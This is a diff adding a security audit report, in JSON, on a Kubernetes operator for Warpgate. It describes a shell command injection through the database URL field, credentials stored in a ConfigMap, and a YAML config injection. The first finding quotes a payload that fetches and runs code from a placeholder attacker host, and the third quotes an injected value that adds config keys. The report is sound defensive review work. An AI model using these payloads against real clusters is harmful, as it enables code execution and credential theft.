@@ -1,0 +1,64 @@
+{
+  "summary": "Reviewed the warpgate-operator Go sources under api/v1alpha1 (types, webhooks), cmd/main.go, internal/controller (reconcilers and helpers), and internal/warpgate (REST client and resource helpers). The operator is a Kubernetes controller that provisions Warpgate instances and syncs users/targets/credentials via an admin REST API, reading credentials from Secrets. The dominant trust boundary is the set of CRDs (especially WarpgateInstance) that any principal with create/update RBAC can submit. The most serious issue is an OS command injection in the WarpgateInstance init script via the unvalidated spec.databaseURL field, which yields arbitrary code execution inside the instance pod. Secondary issues involve storing database credentials in a ConfigMap and YAML config injection, both stemming from unsanitized spec strings. Credential handling (Secret reads, crypto/rand password generation, ticket secrets) is otherwise sound and no secrets are logged.",
+  "coverage": [
+    "cmd/main.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/warpgateuser_controller.go",
+    "internal/controller/warpgatetarget_controller.go",
+    "internal/controller/httproute_watcher_controller.go",
+    "internal/controller/helpers.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/parameters.go",
+    "internal/warpgate/ssh_keys.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateinstance_types.go",
+    "api/v1alpha1/warpgateconnection_webhook.go",
+    "api/v1alpha1/warpgatetarget_webhook.go"
+  ],
+  "findings": [
+    {
+      "title": "OS command injection via spec.databaseURL in WarpgateInstance init container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles a shell script from string fragments and runs it with `/bin/sh -c` in the init container (Command at lines 772-791). The user-controlled spec.databaseURL is concatenated into that script via fmt.Sprintf with only surrounding double quotes and no escaping. Any principal with create/update RBAC on warpgateinstances.warpgate.warpgate.warp.tech can set databaseURL to a value such as `sqlite:/data/db\"; wget http://attacker/x -O /tmp/x; sh /tmp/x; echo \"` to break out of the quotes and execute arbitrary commands. The admission webhook (validateWarpgateInstance) does not constrain databaseURL (it only emits a warning), and the CRD field has no Pattern/MaxLength marker, so the payload passes validation. Execution occurs inside the instance pod with the pod's ServiceAccount token and with the Warpgate admin password injected as the ADMIN_PASSWORD env var and any mounted SSH host keys available, enabling credential theft and lateral movement.",
+      "evidence": "Sink: `setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL)` (lines 556-558). setupCmd is appended into scriptParts (line 570), joined into initScript (line 611), and executed: `Command: []string{\"/bin/sh\", \"-c\", initScript}` (line 776). Source: spec.databaseURL is a free-form string with no CRD validation (api/v1alpha1/warpgateinstance_types.go:83-86) and no webhook check beyond a warning (api/v1alpha1/warpgateinstance_webhook.go:256-258).",
+      "recommendation": "Do not interpolate user input into a shell command string. Pass warpgate arguments as an argv array (exec form) instead of `/bin/sh -c`, or supply the database URL to the init container through an environment variable referenced as `\"${DATABASE_URL}\"` (as is already done for ADMIN_PASSWORD) so the shell never parses attacker-controlled text. Additionally add a strict Pattern/validation for databaseURL in the webhook/CRD to reject shell metacharacters."
+    },
+    {
+      "title": "Database connection string with embedded credentials written to a plaintext ConfigMap",
+      "category": "security",
+      "cwe": "CWE-312",
+      "severity": "medium",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 344,
+      "line_end": 345,
+      "description": "buildWarpgateConfig writes spec.databaseURL verbatim into the generated warpgate.yaml, which ensureConfigMap stores in a ConfigMap (data key \"warpgate.yaml\", lines 389-407). Database URLs for the documented PostgreSQL mode embed credentials (the type doc example is `postgres://user:pass@host:5432/warpgate`, warpgateinstance_types.go:83-85). ConfigMaps are not encrypted at rest by default and are readable by any principal with get/list on configmaps in the namespace, so the database password is exposed to a wider audience than a Secret would be.",
+      "evidence": "`fmt.Fprintf(&b, \"database_url: \\\"%s\\\"\\n\", inst.Spec.DatabaseURL)` (line 345) feeds `cm.Data = map[string]string{\"warpgate.yaml\": r.buildWarpgateConfig(inst)}` (lines 401-403) inside ensureConfigMap.",
+      "recommendation": "Keep the database URL out of the ConfigMap. Reference a Secret for the connection string and inject it into the container via env (SecretKeyRef) or a mounted Secret file that Warpgate reads, rather than baking credentials into a ConfigMap-backed config file."
+    },
+    {
+      "title": "YAML config injection via unescaped spec.externalHost/databaseURL in generated warpgate.yaml",
+      "category": "security",
+      "cwe": "CWE-91",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 379,
+      "line_end": 381,
+      "description": "buildWarpgateConfig interpolates spec.externalHost directly into warpgate.yaml with no quoting or escaping, and spec.databaseURL with only quoting. A value containing a newline (e.g. externalHost = \"ok\\nssh:\\n  enable: true\\n  listen: 0.0.0.0:22\") injects arbitrary top-level Warpgate configuration keys, letting a WarpgateInstance author alter listener/protocol settings beyond the intended field. Impact is bounded because the same actor can already supply a full config via spec.configOverride, but this is a distinct unsanitized-input-to-config sink and should be closed. The databaseURL quoted interpolation at line 345 is a second instance of the same flaw.",
+      "evidence": "`fmt.Fprintf(&b, \"external_host: %s\\n\", inst.Spec.ExternalHost)` (line 380), unquoted and unvalidated (externalHost has no CRD Pattern, warpgateinstance_types.go:121-123); related: `database_url: \"%s\"` (line 345). The resulting string is persisted as the warpgate.yaml ConfigMap and copied to /data/warpgate.yaml by the init script.",
+      "recommendation": "Build the config with a real YAML marshaller (e.g. sigs.k8s.io/yaml / gopkg.in/yaml.v3) that quotes and escapes values, instead of fmt.Fprintf string building, and/or validate externalHost against a hostname pattern in the webhook."
+    }
+  ]
+}
